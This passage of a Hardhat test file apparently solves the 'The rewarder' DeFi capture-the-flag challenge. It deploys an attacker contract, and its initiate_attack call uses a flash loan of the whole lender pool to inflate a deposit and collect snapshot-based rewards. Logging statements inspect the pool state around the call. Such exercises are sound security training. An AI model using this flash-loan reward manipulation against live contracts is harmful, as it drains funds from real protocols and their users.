...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackContractFactory = await ethers.getContractFactory('theRewarderSolution', attacker);
        this.attackContract = await AttackContractFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, this.rewardToken.address);

        /** CODE YOUR EXPLOIT HERE */
        //at the begining it is not a reward round.
        let IS_NEW_ROUND = await this.rewarderPool.isNewRewardsRound();
        let LAST_ID = (await this.rewarderPool.lastSnapshotIdForRewards()).toString();
        let LAST_TIME = (await this.rewarderPool.lastRecordedSnapshotTimestamp()).toString();
        console.log("Is new reward round: ", IS_NEW_ROUND);
        console.log("The last recorded snapshot ID: ", LAST_ID);
        console.log("The last recorded snapshot time: ", LAST_TIME);
        console.log("------------------------------------------------");
        console.log("The last recorded token supply: ", (await this.accountingToken.totalSupplyAt(LAST_ID)).toString());
        console.log("The last recorded attacker balance deposited: ", (await this.accountingToken.balanceOfAt(this.attackContract.address, LAST_ID)).toString());


        //flashloan are managed on the liquidity token.
        //flashloan will be sent form the FlashLoanerPool contract
        //deposit big amount form flashloan
        await this.attackContract.connect(attacker).initiate_attack(TOKENS_IN_LENDER_POOL);
        // await this.liquidityToken.approve(this.rewarderPool.address, TOKENS_IN_LENDER_POOL);
        // await this.rewardToken.deposit(TOKENS_IN_LENDER_POOL);

        console.log("The last recorded token supply: ", (await this.accountingToken.totalSupplyAt(LAST_ID)).toString());
        console.log("The last recorded attacker balance deposited: ", (await this.accountingToken.balanceOfAt(this.attackContract.address, LAST_ID)).toString());
        console.log("Check reward tokens earned by attackerContract: ", (await this.rewardToken.balanceOf(this.attackContract.address)).toString());
